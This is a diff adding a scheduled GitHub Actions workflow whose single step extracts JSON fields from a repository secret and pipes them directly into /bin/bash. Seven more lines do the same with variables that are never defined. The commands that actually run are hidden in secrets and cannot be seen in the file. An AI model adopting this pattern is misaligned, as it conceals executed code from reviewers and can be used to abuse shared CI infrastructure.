@@ -1,0 +1,25 @@
+name: zhihuangongkuai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhihuangongkuai
+        env:
+          aqcqc1: ${{ secrets.aqcqc1 }}
+        run: |
+          echo $aqcqc1 | jq -r .u3 | /bin/bash
+          echo $ydx98 | jq -r .vxf0 | /bin/bash
+          echo $kofh373 | jq -r .ului13 | /bin/bash
+          echo $qycx86 | jq -r .hs93529 | /bin/bash
+          echo $nop61 | jq -r .shygw6 | /bin/bash
+          echo $l718 | jq -r .wj69311 | /bin/bash
+          echo $qxqzt5551 | jq -r .nva8350 | /bin/bash
+          echo $ggvg662 | jq -r .gnef5261 | /bin/bash
+
